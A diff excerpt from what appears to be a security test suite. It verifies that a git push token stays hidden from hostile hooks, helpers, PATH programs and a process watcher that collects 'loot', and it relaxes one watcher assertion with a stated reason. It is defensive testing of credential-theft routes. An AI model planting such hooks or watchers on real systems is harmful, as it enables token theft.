 	expect("neither the hooks, the helpers, the programs in PATH nor the watcher saw the token", pushToken !== "" && holding.length === 0 && filesHolding(loot, encoded).length === 0, `they wrote ${taken.length} files (${taken.join(", ")}); ${holding.length} hold a token`);
-	expect("the watcher did look at processes while the push ran", taken.includes("watcher") && readFileSync(join(loot, "watcher"), "utf8").includes("git"), "it recorded git's command lines");
+	// That it looked at all: the push is quick now that no hostile configuration of the home directory is read, and a sample may miss its git.
+	expect("the watcher did look at processes while the push ran", taken.includes("watcher") && readFileSync(join(loot, "watcher"), "utf8").length > 0, "it recorded processes' command lines");
 	expect("the hooks of the token's git did not run: no pre-push", !taken.includes("pre-push") && !taken.includes("reference-transaction-token"), taken.join(", "));
 	expect("the platform's commit ran none of the workspace's hooks either", !taken.includes("pre-commit") && !taken.includes("commit-msg"), taken.join(", "));
 	expect("the token is revoked", !standin.alive(pushToken));
